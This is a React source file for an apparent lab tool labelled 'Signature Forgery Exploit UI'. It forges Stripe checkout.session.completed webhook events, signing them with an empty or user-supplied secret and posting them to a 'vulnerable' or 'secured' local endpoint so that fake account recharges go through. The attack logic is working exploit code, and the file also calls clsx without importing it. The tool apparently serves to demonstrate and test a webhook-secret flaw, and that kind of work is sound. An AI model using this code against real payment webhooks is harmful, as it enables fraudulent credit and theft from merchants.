import React, { useState } from 'react';
import { Terminal, Shield, ShieldAlert, Zap, Server, Code, Activity, CheckCircle, XCircle } from 'lucide-react';
import CryptoJS from 'crypto-js';

// Types
type TargetEnv = 'vuln' | 'fixed';

interface LogEntry {
  time: string;
  type: 'info' | 'success' | 'error' | 'request' | 'response';
  message: string;
  details?: any;
}

function App() {
  const [target, setTarget] = useState<TargetEnv>('vuln');
  const [clientId, setClientId] = useState('USR-9999-HACK-123456');
  const [amount, setAmount] = useState(9999);
  const [secret, setSecret] = useState('');
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [isHacking, setIsHacking] = useState(false);

  const addLog = (type: LogEntry['type'], message: string, details?: any) => {
    setLogs(prev => [...prev, {
      time: new Date().toLocaleTimeString(),
      type,
      message,
      details
    }]);
  };

  const forgeSignature = (payloadStr: string, secretKey: string, timestamp: string) => {
    const signedPayload = `${timestamp}.${payloadStr}`;
    const hash = CryptoJS.HmacSHA256(signedPayload, secretKey);
    const v1 = hash.toString(CryptoJS.enc.Hex);
    return `t=${timestamp},v1=${v1}`;
  };

  const executeAttack = async () => {
    setIsHacking(true);
    setLogs([]); // Clear previous logs
    addLog('info', '开始构造攻击载荷 (Payload)...');

    const payload = {
      id: "evt_test_forgery_" + Math.random().toString(36).substring(7),
      type: "checkout.session.completed",
      data: {
        object: {
          id: "cs_test_hacked_" + Math.random().toString(36).substring(7),
          client_reference_id: clientId,
          status: "complete",
          payment_status: "paid",
          amount_total: amount * 100 // Stripe expects cents
        }
      }
    };

    // Serialize payload exactly as needed (no spaces)
    const jsonBody = JSON.stringify(payload);
    addLog('info', 'Payload 构造完成', payload);

    const timestamp = Math.floor(Date.now() / 1000).toString();
    addLog('info', `使用 Secret: "${secret}" 生成伪造签名...`);
    
    const signature = forgeSignature(jsonBody, secret, timestamp);
    addLog('info', `生成签名 (Stripe-Signature): ${signature}`);

    const endpoint = target === 'vuln' ? '/api/vuln/api/stripe/webhook' : '/api/fixed/api/stripe/webhook';
    
    addLog('request', `POST ${endpoint}`, {
      headers: {
        'Content-Type': 'application/json',
        'Stripe-Signature': signature
      },
      body: payload
    });

    try {
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Stripe-Signature': signature
        },
        body: jsonBody
      });

      const responseText = await response.text();
      
      addLog('response', `服务端响应状态码: ${response.status} ${response.statusText}`, responseText);

      if (response.ok) {
        addLog('success', '🎉 攻击成功！服务端已接受伪造的请求并执行了充值逻辑。');
      } else {
        addLog('error', '❌ 攻击失败，服务端拒绝了伪造请求。');
      }
    } catch (error: any) {
      addLog('error', `网络请求失败: ${error.message}`);
    } finally {
      setIsHacking(false);
    }
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-300 font-sans selection:bg-emerald-500/30">
      {/* Header */}
      <header className="border-b border-slate-800 bg-slate-900/50 backdrop-blur-sm sticky top-0 z-10">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-rose-500/10 rounded-lg">
              <ShieldAlert className="w-6 h-6 text-rose-500" />
            </div>
            <div>
              <h1 className="font-bold text-slate-100">Stripe Webhook Vulnerability Tester</h1>
              <p className="text-xs text-slate-500">Signature Forgery Exploit UI</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <span className="flex items-center gap-2 text-xs font-medium px-3 py-1.5 rounded-full bg-slate-800 text-slate-400 border border-slate-700">
              <Activity className="w-4 h-4 text-emerald-500" />
              SYSTEM READY
            </span>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 py-8 grid lg:grid-cols-12 gap-8">
        
        {/* Left Column: Controls & Flow */}
        <div className="lg:col-span-4 space-y-6">
          
          {/* Attack Configuration */}
          <section className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden shadow-2xl shadow-black/50">
            <div className="px-5 py-4 border-b border-slate-800 flex items-center gap-2">
              <Zap className="w-5 h-5 text-amber-500" />
              <h2 className="font-semibold text-slate-100">Attack Vector Config</h2>
            </div>
            
            <div className="p-5 space-y-5">
              {/* Target Env */}
              <div className="space-y-2">
                <label className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Target Environment</label>
                <div className="grid grid-cols-2 gap-3">
                  <button
                    onClick={() => setTarget('vuln')}
                    className={`flex flex-col items-center justify-center p-3 rounded-lg border transition-all ${
                      target === 'vuln' 
                        ? 'border-rose-500 bg-rose-500/10 text-rose-400' 
                        : 'border-slate-700 bg-slate-800 text-slate-400 hover:border-slate-600'
                    }`}
                  >
                    <Server className="w-5 h-5 mb-1" />
                    <span className="text-sm font-medium">Vulnerable (:8080)</span>
                  </button>
                  <button
                    onClick={() => setTarget('fixed')}
                    className={`flex flex-col items-center justify-center p-3 rounded-lg border transition-all ${
                      target === 'fixed' 
                        ? 'border-emerald-500 bg-emerald-500/10 text-emerald-400' 
                        : 'border-slate-700 bg-slate-800 text-slate-400 hover:border-slate-600'
                    }`}
                  >
                    <Shield className="w-5 h-5 mb-1" />
                    <span className="text-sm font-medium">Secured (:8081)</span>
                  </button>
                </div>
              </div>

              {/* Secret Key */}
              <div className="space-y-2">
                <label className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Signing Secret</label>
                <input
                  type="text"
                  value={secret}
                  onChange={(e) => setSecret(e.target.value)}
                  placeholder="Leave empty for zero-secret attack"
                  className="w-full bg-slate-950 border border-slate-700 rounded-lg px-4 py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all placeholder:text-slate-600 font-mono"
                />
                <p className="text-xs text-slate-500">Stripe HMAC secret used to sign the payload.</p>
              </div>

              {/* Client ID */}
              <div className="space-y-2">
                <label className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Target User ID</label>
                <input
                  type="text"
                  value={clientId}
                  onChange={(e) => setClientId(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-700 rounded-lg px-4 py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all font-mono"
                />
              </div>

              {/* Amount */}
              <div className="space-y-2">
                <label className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Recharge Amount ($)</label>
                <div className="relative">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500">$</span>
                  <input
                    type="number"
                    value={amount}
                    onChange={(e) => setAmount(Number(e.target.value))}
                    className="w-full bg-slate-950 border border-slate-700 rounded-lg pl-8 pr-4 py-2.5 text-sm text-slate-300 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition-all font-mono"
                  />
                </div>
              </div>

              {/* Action */}
              <button
                onClick={executeAttack}
                disabled={isHacking}
                className="w-full relative group overflow-hidden rounded-lg mt-4 disabled:opacity-70 disabled:cursor-not-allowed"
              >
                <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-indigo-500 via-purple-500 to-rose-500 opacity-80 group-hover:opacity-100 transition-opacity"></div>
                <div className="relative px-6 py-3 flex items-center justify-center gap-2 text-white font-bold tracking-wide text-sm">
                  {isHacking ? (
                    <span className="flex items-center gap-2">
                      <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      EXECUTING...
                    </span>
                  ) : (
                    <span className="flex items-center gap-2">
                      <Code className="w-5 h-5" />
                      EXECUTE ATTACK
                    </span>
                  )}
                </div>
              </button>
            </div>
          </section>

          {/* Explainer */}
          <section className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden shadow-lg p-5">
            <h3 className="text-sm font-semibold text-slate-300 mb-4 flex items-center gap-2">
              <Activity className="w-4 h-4 text-indigo-400" />
              Attack Flow
            </h3>
            <div className="space-y-4">
              {[
                { step: 1, text: "Configure fake session payload" },
                { step: 2, text: "Hash payload with empty secret" },
                { step: 3, text: "Send POST to /api/stripe/webhook" },
                { step: 4, text: "Server validates signature (Success if secret is empty)" },
                { step: 5, text: "Zero-dollar recharge executed" },
              ].map((item, idx) => (
                <div key={idx} className="flex items-start gap-3">
                  <div className="w-6 h-6 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-xs font-mono text-slate-400 shrink-0">
                    {item.step}
                  </div>
                  <p className="text-sm text-slate-400 leading-tight pt-1">{item.text}</p>
                </div>
              ))}
            </div>
          </section>
        </div>

        {/* Right Column: Terminal */}
        <div className="lg:col-span-8 flex flex-col">
          <section className="flex-1 bg-[#0a0a0a] border border-slate-800 rounded-xl overflow-hidden shadow-2xl shadow-black/50 flex flex-col font-mono text-sm relative">
            
            {/* Terminal Header */}
            <div className="px-4 py-3 bg-slate-900 border-b border-slate-800 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Terminal className="w-4 h-4 text-slate-500" />
                <span className="text-slate-400 text-xs tracking-wider">ATTACK_TERMINAL // STDOUT</span>
              </div>
              <div className="flex gap-1.5">
                <div className="w-3 h-3 rounded-full bg-rose-500/20 border border-rose-500/50"></div>
                <div className="w-3 h-3 rounded-full bg-amber-500/20 border border-amber-500/50"></div>
                <div className="w-3 h-3 rounded-full bg-emerald-500/20 border border-emerald-500/50"></div>
              </div>
            </div>

            {/* Terminal Output */}
            <div className="flex-1 p-5 overflow-y-auto space-y-3 max-h-[600px] scrollbar-thin scrollbar-thumb-slate-700 scrollbar-track-transparent">
              {logs.length === 0 ? (
                <div className="text-slate-600 flex items-center gap-2 h-full justify-center">
                  <Terminal className="w-5 h-5 opacity-50" />
                  Waiting for execution...
                </div>
              ) : (
                logs.map((log, index) => (
                  <div key={index} className="animate-in fade-in slide-in-from-bottom-2 duration-300">
                    <div className="flex items-start gap-3">
                      <span className="text-slate-600 shrink-0 select-none">[{log.time}]</span>
                      <div className="flex-1 overflow-hidden">
                        
                        {/* Log Message */}
                        <span className={clsx(
                          "whitespace-pre-wrap break-words",
                          log.type === 'info' && "text-blue-400",
                          log.type === 'success' && "text-emerald-400 font-bold",
                          log.type === 'error' && "text-rose-400 font-bold",
                          log.type === 'request' && "text-amber-400",
                          log.type === 'response' && "text-purple-400"
                        )}>
                          {log.type === 'success' && <CheckCircle className="w-4 h-4 inline mr-2 -mt-1" />}
                          {log.type === 'error' && <XCircle className="w-4 h-4 inline mr-2 -mt-1" />}
                          {log.message}
                        </span>

                        {/* Details JSON */}
                        {log.details && (
                          <div className="mt-2 bg-black/50 p-3 rounded border border-slate-800/50 overflow-x-auto text-xs text-slate-300">
                            {typeof log.details === 'string' ? (
                              <pre>{log.details}</pre>
                            ) : (
                              <pre>{JSON.stringify(log.details, null, 2)}</pre>
                            )}
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                ))
              )}
              {isHacking && (
                <div className="flex items-center gap-2 text-slate-500 animate-pulse">
                  <span className="w-2 h-4 bg-slate-500 block"></span>
                </div>
              )}
            </div>
          </section>
        </div>

      </main>
    </div>
  );
}

export default App;
